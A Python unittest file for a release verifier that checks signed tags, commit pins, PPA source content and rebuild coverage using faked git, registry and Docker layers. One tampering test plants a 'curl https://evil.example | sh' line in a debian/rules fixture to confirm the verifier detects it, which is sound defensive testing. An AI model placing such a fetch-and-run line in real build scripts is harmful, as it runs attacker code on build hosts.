"""`verify` orchestration with git, GitHub, gpg, the registry and Docker replaced by fakes."""

import copy
import hashlib
import lzma
import os
import shutil
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

from release_verifier import channels, gitops, rebuild, verify, watch
from release_verifier.config import Project, load
from release_verifier.results import Status
from release_verifier.state import State

FIX = Path(__file__).parent / "fixtures"
C230 = "abcdef1234567890abcdef1234567890abcdef12"
C220 = "1d2aff00ccee8df1ffabc142ee8ea61b3760754e"
X64 = "5217a3b6fbd613696affd87cad595f0351cd9c5b68ddd4701bbcdf43f70ec55d"
ARM64 = "281f7e4cb8724492d872e46986c45e36529d7689441a271f3296fc221e60674b"


class FakeSource:
    """Stands in for gitops.SourceRepo; records whether anything was checked out."""

    kind = "tag"
    signature_ok = True
    commit = C230
    checkouts: list = []

    def __init__(self, path, url):
        pass

    def fetch(self, tag):
        pass

    def object_type(self, ref):
        return self.kind

    def peel(self, tag):
        return self.commit

    def commit_time(self, commit):
        return 1760000000

    def verify_tag(self, *args):
        return gitops.TagVerification(self.signature_ok, "")

    tag_name = None  # the signed tag object's `tag` header; None = the requested tag

    def tag_headers(self, tag):
        return {"object": self.commit, "type": "commit", "tag": self.tag_name or tag, "tagger": "x"}

    def checkout(self, commit, dest):
        FakeSource.checkouts.append(commit)
        Path(dest).mkdir(parents=True, exist_ok=True)

    def archive(self, ref, path):
        assert (ref, path) == (C220, "scripts/build/ppa")
        return lzma.decompress((FIX / "ppa-source-2.2.0.tar.xz").read_bytes())

    def remove_checkout(self, dest):
        pass


class FakeRegistry:
    def __init__(self, *args):
        pass

    def describe(self, repo, tag):
        return {"index_digest": f"sha256:idx-{tag}", "platforms": {
            "linux/amd64": {"manifest": "sha256:m1", "config": "sha256:c1"},
            "linux/arm64": {"manifest": "sha256:m2", "config": "sha256:c2"},
        }}


@unittest.skipUnless(hasattr(os, "getuid"), "verify runs rebuilds as the invoking POSIX user; the verifier targets Linux")
class VerifyHarness(unittest.TestCase):
    """Runs the real Verifier. Stages that need real artifacts (downloads, signatures, checksums,
    attestations, channels) are no-ops; rebuild entry points are mocks that record calls."""

    tag = "2.3.0"
    source_kind = "tag"
    source_commit = C230
    noop = ("_download_and_check_signatures", "_checksums", "_release_attestation", "_provenance", "_channels")

    def setUp(self):
        FakeSource.kind, FakeSource.signature_ok, FakeSource.commit, FakeSource.tag_name = self.source_kind, True, self.source_commit, None
        FakeSource.checkouts = []
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        base = load("nethermind")
        raw = copy.deepcopy(base.raw)
        raw.pop("attestations")
        raw.pop("channels")
        for f in raw["images"]["flavors"]:
            f.pop("labels")
        self.project = Project(base.path, raw)
        self.state = State(self.tmp / "state", "nethermind")
        assets = [{"name": f"nethermind-{self.tag}-{FakeSource.commit[:8]}-{p.name}.zip", "browser_download_url": "x", "id": i}
                  for i, p in enumerate(base.platforms)]
        release = {"id": 1, "tag_name": self.tag, "assets": assets, "published_at": "2026-10-16T16:26:20Z"}
        self.calls = {n: mock.MagicMock(name=n) for n in ("rebuild_packages", "archive_packages", "build_image", "ensure_builder")}
        patches = [
            mock.patch.object(gitops, "SourceRepo", FakeSource),
            mock.patch.object(verify.github, "release_by_tag", return_value=release),
            mock.patch.object(verify, "Keyring", mock.MagicMock()),
            mock.patch.object(verify, "fetch_pinned_key", return_value=(b"", "pinned")),
            mock.patch.object(verify, "Registry", FakeRegistry),
            *(mock.patch.object(rebuild, n, m) for n, m in self.calls.items()),
            *(mock.patch.object(verify.Verifier, n, lambda self: None) for n in self.noop),
        ]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)

    def run_verify(self, **opts):
        return verify.run(self.project, self.state, verify.Options(tag=self.tag, work_dir=self.tmp / "work", **opts))

    def results(self, report, check):
        return [r for r in report.results if r.check == check]


class SourceAuthenticationTest(VerifyHarness):
    def assert_nothing_executed(self, report):
        self.assertEqual(FakeSource.checkouts, [])
        for name, m in self.calls.items():
            self.assertFalse(m.called, f"{name} was called for unauthenticated source")
        [pkg] = self.results(report, "package-rebuild")
        self.assertEqual(pkg.status, Status.SKIPPED)
        self.assertIn("source not authenticated", pkg.message)
        imgs = self.results(report, "image-rebuild")
        self.assertEqual({r.status for r in imgs}, {Status.SKIPPED})
        self.assertTrue(all("source not authenticated" in r.message for r in imgs))

    def test_failed_tag_signature_runs_nothing_from_the_source(self):
        FakeSource.signature_ok = False
        with mock.patch.object(verify.Verifier, "_package_rebuild") as pkg:
            report = self.run_verify()
        pkg.assert_not_called()
        self.assert_nothing_executed(report)
        self.assertEqual(self.results(report, "signed-tag")[0].status, Status.FAIL)
        self.assertEqual(report.meta["source"], "unauthenticated")

    def test_lightweight_tag_after_cutoff_runs_nothing(self):
        FakeSource.kind = "commit"
        self.assert_nothing_executed(self.run_verify())

    def test_valid_signature_allows_rebuild(self):
        report = self.run_verify(skip_image_rebuild=True)
        self.assertEqual(report.meta["source"], "signed")
        self.calls["rebuild_packages"].assert_called_once()
        self.assertEqual(FakeSource.checkouts, [C230])


class LegacyPinTest(VerifyHarness):
    tag = "2.2.0"
    source_kind = "commit"
    source_commit = C220

    def test_pinned_legacy_tag_is_authenticated(self):
        report = self.run_verify(skip_image_rebuild=True)
        self.assertEqual(report.meta["source"], "pinned")
        self.assertEqual(self.results(report, "signed-tag")[0].status, Status.LEGACY)
        self.assertEqual(self.results(report, "source-pin")[0].status, Status.PASS)
        self.calls["rebuild_packages"].assert_called_once()

    def test_unpinned_legacy_tag_is_not_built(self):
        del self.project.raw["tags"]["trusted_commits"]
        report = self.run_verify()
        self.assertEqual(report.meta["source"], "unauthenticated")
        self.assertEqual(report.exit_code, 0)  # legacy gap, not a compromise
        self.assertEqual(FakeSource.checkouts, [])
        self.calls["rebuild_packages"].assert_not_called()
        self.assertIn("without a tags.trusted_commits pin", self.results(report, "package-rebuild")[0].message)

    def test_pin_mismatch_fails_and_runs_nothing(self):
        self.project.raw["tags"]["trusted_commits"]["2.2.0"] = "f" * 40
        report = self.run_verify()
        self.assertEqual(self.results(report, "source-pin")[0].status, Status.FAIL)
        self.assertEqual(FakeSource.checkouts, [])
        self.calls["rebuild_packages"].assert_not_called()
        self.calls["build_image"].assert_not_called()


class PpaContentVerifyTest(VerifyHarness):
    """The PPA reference comes from the authenticated tree at the tag, with the verified hashes."""

    tag = "2.2.0"
    source_kind = "commit"
    source_commit = C220
    noop = ("_checksums", "_release_attestation", "_provenance")

    def setUp(self):
        super().setUp()
        base = load("nethermind")
        self.project.raw["channels"] = [c for c in base.channels if c["type"] == "ppa"]
        published = channels.tar_tree((FIX / "nethermind_2.2.0.tar.xz").read_bytes())
        self.ppa = {"2.2.0": {"series": ["jammy", "noble", "resolute"], "dsc_signature": "valid", "tarball_matches_dsc": True,
                              "entries": channels.parse_postinst(published["debian/postinst"]["text"]),
                              "trees": {"nethermind_2.2.0.tar.xz": published}}}

        def signed_downloads(v):
            for p, sha in (("linux-arm64", ARM64), ("linux-x64", X64)):
                name = f"nethermind-2.2.0-1d2aff00-{p}.zip"
                v.c.hashes[name] = sha
                v.c.signed_ok.add(name)

        for p in (mock.patch.object(verify.Verifier, "_download_and_check_signatures", signed_downloads),
                  mock.patch.object(verify.ch, "fetch_ppa", lambda *a: {"sources": copy.deepcopy(self.ppa), "other_packages": {}})):
            p.start()
            self.addCleanup(p.stop)

    def test_published_source_matches_the_pinned_tree(self):
        report = self.run_verify(skip_rebuild=True)
        [r] = self.results(report, "channel-content")
        self.assertEqual(r.status, Status.PASS, r.message)
        ref = self.state.load_verified()["2.2.0"]["references"]["ppa"]
        self.assertEqual(ref["commit"], C220)
        self.assertNotIn("text", ref["files"]["debian/postinst"])

    def test_tampered_source_package_fails(self):
        tree = self.ppa["2.2.0"]["trees"]["nethermind_2.2.0.tar.xz"]
        tree["debian/rules"] = channels._file_entry("#!/usr/bin/make -f\n%:\n\tcurl https://evil.example | sh\n")
        [r] = self.results(self.run_verify(skip_rebuild=True), "channel-content")
        self.assertEqual(r.status, Status.FAIL)
        self.assertIn("debian/rules changed", r.message)

    def test_unauthenticated_source_skips_the_content_check(self):
        del self.project.raw["tags"]["trusted_commits"]
        report = self.run_verify(skip_rebuild=True)
        [r] = self.results(report, "channel-content")
        self.assertEqual(r.status, Status.SKIPPED)
        self.assertEqual(self.state.load_verified()["2.2.0"]["references"], {})


class CoverageTest(VerifyHarness):
    """Trust needs every published package and image rebuilt and matching, not just exit code 0."""

    noop = ("_checksums", "_release_attestation", "_provenance", "_channels")

    def setUp(self):
        super().setUp()
        platforms = self.project.platforms

        def downloads(v):
            for pl in platforms:
                name = f"nethermind-{self.tag}-{C230[:8]}-{pl.name}.zip"
                path = self.tmp / "dl" / name
                path.parent.mkdir(exist_ok=True)
                with zipfile.ZipFile(path, "w") as z:
                    z.writestr("nethermind", f"bin-{pl.name}")
                v.c.downloads[name], v.c.hashes[name] = path, hashlib.sha256(path.read_bytes()).hexdigest()
                v.c.signed_ok.add(name)

        def build(recipe, ctx, *args):
            for pl in platforms:
                d = Path(ctx["out_dir"]) / pl.build_dir
                d.mkdir(parents=True)
                (d / "nethermind").write_text(f"bin-{pl.name}")

        self.calls["rebuild_packages"].side_effect = build
        self.calls["archive_packages"].return_value = self.tmp / "dl"  # the archive step reproduces the published zips
        configs = {"linux/amd64": "sha256:c1", "linux/arm64": "sha256:c2"}
        for p in (mock.patch.object(verify.Verifier, "_download_and_check_signatures", downloads),
                  mock.patch.object(rebuild, "oci_layout_image", lambda tar, pl: {"config": configs[pl], "manifest": "sha256:m", "config_doc": {}})):
            p.start()
            self.addCleanup(p.stop)

    def latest(self):
        """`watch`'s verdict on `latest` pointing at this release's default image."""
        images = {"nethermind/nethermind:latest": {"index_digest": f"sha256:idx-{self.tag}", "flavor": "default", "version": None}}
        return watch._evaluate_latest(self.project, "nethermind/nethermind:latest", images["nethermind/nethermind:latest"], images,
                                      {self.tag: {"prerelease": False}}, self.state.load_verified(), self.project.flavors[0])

    def record(self):
        return self.state.load_verified()[self.tag]

    def test_full_run_is_trusted(self):
        report = self.run_verify()
        self.assertEqual(report.exit_code, 0, report.summary())
        rec = self.record()
        self.assertEqual(set(rec["coverage"]["packages"].values()), {"identical"})
        self.assertEqual(set(rec["coverage"]["images"].values()), {"identical"})
        self.assertEqual(len(rec["coverage"]["images"]), 4)
        self.assertTrue(rec["trusted"])
        self.assertEqual(self.latest().status, Status.PASS)
        self.assertEqual(self.calls["build_image"].call_count, 4)
        self.calls["ensure_builder"].assert_called_once()  # not once per flavor x platform

    def test_skipped_rebuild_passes_but_is_not_trusted(self):
        report = self.run_verify(skip_rebuild=True)
        self.assertEqual(report.exit_code, 0)
        rec = self.record()
        self.assertEqual(rec["outcome"], "pass")
        self.assertFalse(rec["trusted"])
        self.assertEqual(set(rec["coverage"]["packages"].values()) | set(rec["coverage"]["images"].values()), {"skipped"})
        r = self.latest()
        self.assertEqual(r.status, Status.WARN)
        self.assertIn("packages skipped", r.message)

    def test_subsets_are_not_trusted(self):
        cases = [
            ({"platforms": ["linux-x64"]}, "packages skipped: linux-arm64"),
            ({"image_platforms": ["linux/amd64"]}, "images skipped: nethermind/nethermind:2.3.0-chiseled@linux/arm64, nethermind/nethermind:2.3.0@linux/arm64"),
            ({"flavors": ["default"]}, "images skipped: nethermind/nethermind:2.3.0-chiseled@linux/amd64"),
            ({"skip_image_rebuild": True}, "images skipped"),
        ]
        for opts, gap in cases:
            with self.subTest(opts=opts):
                FakeSource.checkouts = []
                report = self.run_verify(**opts)
                self.assertEqual(report.exit_code, 0)
                self.assertFalse(self.record()["trusted"])
                self.assertIn(gap, self.latest().message)

    def test_unauthenticated_source_is_not_trusted(self):
        FakeSource.signature_ok = False
        self.run_verify()
        self.assertEqual(self.record()["coverage"]["source"], "unauthenticated")
        self.assertEqual(self.record()["outcome"], "fail")
        self.assertEqual(self.latest().status, Status.FAIL)


if __name__ == "__main__":
    unittest.main()
